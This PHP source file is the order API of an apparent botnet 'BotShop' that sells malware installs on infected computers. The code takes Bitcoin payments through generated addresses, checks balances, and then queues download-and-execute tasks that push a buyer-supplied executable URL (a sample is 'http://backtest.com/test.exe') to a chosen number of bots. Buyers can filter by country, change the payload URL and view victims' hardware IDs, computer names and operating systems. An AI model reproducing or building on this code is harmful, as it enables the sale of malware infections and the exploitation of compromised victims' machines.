<?php

/*
 *              TODO:

- Create order (Bitcoin or Ethereum Payments) get address  //hd-wallet-derive
- Check if Payed and create Task
- Get task Info

 *
 */

//https://github.com/Bit-Wasp/bitcoin-php/tree/master/examples

use BitWasp\Bitcoin\Address\PayToPubKeyHashAddress;
use BitWasp\Bitcoin\Bitcoin;
use BitWasp\Bitcoin\Crypto\Random\Random;
use BitWasp\Bitcoin\Key\Factory\PrivateKeyFactory;
use BitWasp\Bitcoin\Network\NetworkFactory;

class OrderApi
{
    // TODO BotShop API

    private $priceperbot;
    private $isTestnet = true;
    private $blockchainAPI;
    private $blockconfirms;

    function __construct()
    {
        $price = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = ? ");
        $price->execute(array("mix"));
        $DefaultMixPrice = $price->fetch();
        $this->priceperbot = floatval($DefaultMixPrice);
        $this->blockconfirms = 1;
        if($this->isTestnet){
            $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTCTEST/";
        }else{
            $this->blockchainAPI = "https://chain.so/api/v2/get_address_balance/BTC/";
        }
    }


    private function checkApi(){
        $login = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE apikey = ? AND active = 1");
        $login->execute(array($_POST["apikey"]));
        $access = $login->fetch();
        if($access == false){
            //BruteForce Handler?
            die("Wrong API");
        }
    }

    function command_exist($cmd)
    {
        $return = shell_exec(sprintf("which %s", escapeshellarg($cmd)));
        return !empty($return);
    }

    private function botsToUSD($bots)
    {
        return $bots * $this->priceperbot;
    }

    private function generateRandomString($length = 10) {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    private function generateOrder($type, $bots,$loadurl,$apikey)
    {
        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);
        $usd = $this->botsToUSD($bots);
        $userAuthkey = md5($this->generateRandomString(30));
        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey));
        return array(
            "address" => $bitcoinAddress["address"],
            "coinsToPay" => $coinsToPay,
            "usd" => $usd,
            "userAuthkey" => $userAuthkey,
        );
    }

    private function generateOrderMix($type, $bots,$loadurl,$apikey,$mix)
    {
        $bitcoinAddress = $this->generateBitcoinAddress($this->isTestnet);

        $usd = 0;
        $sql = "SELECT * FROM botshop_pricelist";
        $mixArray = explode(",",$mix);
        $botsDifference = number_format($bots / count($mixArray),0);
        foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
            foreach ($mixArray as $selected){
                if($listItem["iso_short"] == $selected){
                    $usd +=  $botsDifference * $listItem["price_usd"];
                }
            }
        }

        //$usd = $this->botsToUSD($bots);
        $userAuthkey = md5($this->generateRandomString(30));
        $coinsToPay = file_get_contents("https://blockchain.info/tobtc?currency=USD&value=" . $usd);
        $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api,word_mix) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?,?)");
        $statement->execute(array($type, $bitcoinAddress["address"], $bitcoinAddress["privatekey"], $usd, $coinsToPay, $bots,$loadurl,$userAuthkey,$apikey,$mix));
        return array(
            "address" => $bitcoinAddress["address"],
            "coinsToPay" => $coinsToPay,
            "usd" => $usd,
            "userAuthkey" => $userAuthkey,
        );
    }

    private function generateBitcoinAddress($testnet = false)
    {
        if ($testnet == true) {
            Bitcoin::setNetwork(NetworkFactory::bitcoinTestnet());
        }
        $network = BitWasp\Bitcoin\Bitcoin::getNetwork();
        $random = new Random();
        $privKeyFactory = new PrivateKeyFactory();
        $privateKey = $privKeyFactory->generateCompressed($random);
        $publicKey = $privateKey->getPublicKey();
        $address = new PayToPubKeyHashAddress($publicKey->getPubKeyHash());
        return array(
            "address" => $address->getAddress(),
            "privatekey" => $privateKey->toWif($network),
        );
    }

    public function checkAmount($address,$confirms){
       $checked = json_decode(file_get_contents($this->blockchainAPI."/".$address."/".$confirms),true);
       return $checked["data"]["confirmed_balance"];
    }

    public function detils(){
        $this->checkApi();
        $address = $_POST["userauthkey"];
        $statement = $GLOBALS["pdo"]->prepare("SELECT *,tasks.id as taskidsure FROM botshop_orders  LEFT JOIN tasks ON tasks.id = botshop_orders.taskid WHERE botshop_orders.userauthkey = ? AND botshop_orders.payed = 1");
        $statement->execute(array($address));
        $orderTable = $statement->fetch();

        if(empty($orderTable)){
            echo json_encode(array("order"=>"notpayed"));
            die();
        }

        if($_POST["type"] == "taskData"){
            $statement = $GLOBALS["pdo"]->prepare("SELECT   tasks_completed.bothwid, tasks_completed.status, tasks_completed.taskid, bots.country, bots.computrername, bots.operingsystem, tasks.task, tasks.command, tasks.filter, tasks.status as taskstatus FROM `tasks_completed` 
            LEFT JOIN bots ON tasks_completed.bothwid = bots.hwid
            LEFT JOIN tasks ON tasks_completed.taskid = tasks.id
            WHERE tasks_completed.taskid = ?");
            $statement->execute(array($orderTable["taskid"]));
            $order = $statement->fetchAll();
            $order["order"] = $orderTable;

            echo json_encode(array("order"=>$order));
            die();
        }

        if($_POST["type"] == "starttop"){
            if($orderTable["status"] == "1" || $orderTable["status"] == 1){
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
                $statement->execute(array(0, $orderTable["taskidsure"]));
            }else{
                $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET status = ? WHERE id = ?");
                $statement->execute(array(1, $orderTable["taskidsure"]));
            }
            die();
        }

        if($_POST["type"] == "newloadurl"){
            if (filter_var($_POST["url"], FILTER_VALIDATE_URL) === FALSE) {
                die('Not a valid URL');
            }
            $statement = $GLOBALS["pdo"]->prepare("UPDATE tasks SET command = ? WHERE id = ?");
            $statement->execute(array($_POST["url"], $orderTable["taskidsure"]));
            die();
        }


        die();
    }



    public function checkorder(){
        $this->checkApi();
        $address = $_POST["userauthkey"];

        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE userauthkey = ?");
        $statement->execute(array($address));
        $order = $statement->fetch();
        $payAmount = $this->checkAmount( $order["address"],$this->blockconfirms);


        if($order["coinstopay"] <= $payAmount){
            //Update order and insert Task
            if($order["taskid"] == "none"){
                $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
                $statement->execute(array('[]', 0, 'dande', $order["loadurl"], $order["botamount"]));
                $taskid = $GLOBALS["pdo"]->lastInsertId();

                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE address = ?");
                $statement->execute(array(1, $taskid, $order["address"]));
                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
            }else{
                echo json_encode(array("success"=>"true","message"=>"Success Ordered"));
            }

        }else{
            if($payAmount != "0.00000000" || $payAmount != 0){
                echo json_encode(array("success"=>"false","message"=>"Please send more Bitcoin","current"=>$payAmount,"order"=> $order));
            }else{
                echo json_encode(array("success"=>"false","message" => "Please send Bitcoin to the flowing address", "current"=>"" , "order"=>$order));
            }
        }

        die();
    }

    public function checkFunctions()
    {
        die("Disabled for Security");
        echo $this->checkAmount("2MtmwAVzoDcjR9S41SDpAhkbEBJES551ERv",1);
        echo "<hr>";
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access LIMIT 1");
        $statement->execute(array());
        $row = $statement->fetch();
        var_dump($row);
        if($row != false){
            $infos = $this->generateOrder("btc","50","http://backtest.com/test.exe",$row["apikey"]);
            echo json_encode($infos);
        }else{
            die("Create a API Key");
        }
        echo "<hr>";
        die();
    }

    public function createoder(){
        $this->checkApi();
        if(!empty($_POST["load_counties"])){
            $infos = $this->generateOrderMix("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"],$_POST["load_counties"]);
            echo json_encode($infos);
        }else{
            $infos = $this->generateOrder("btc",$_POST["amount"],$_POST["loadurl"],$_POST["apikey"]);
            echo json_encode($infos);
        }
        die();
    }


    public function fetchPriceList(){
        $this->checkApi();

        $prices = [];
        $sql = "SELECT * FROM botshop_pricelist";
        foreach ($GLOBALS["pdo"]->query($sql)->fetchAll(PDO::FETCH_ASSOC) as $listItem) {
            unset($listItem["id"]);
            unset($listItem["created_at"]);
            $prices[] = $listItem;
        }
        echo json_encode($prices);
        die();
    }

}

?>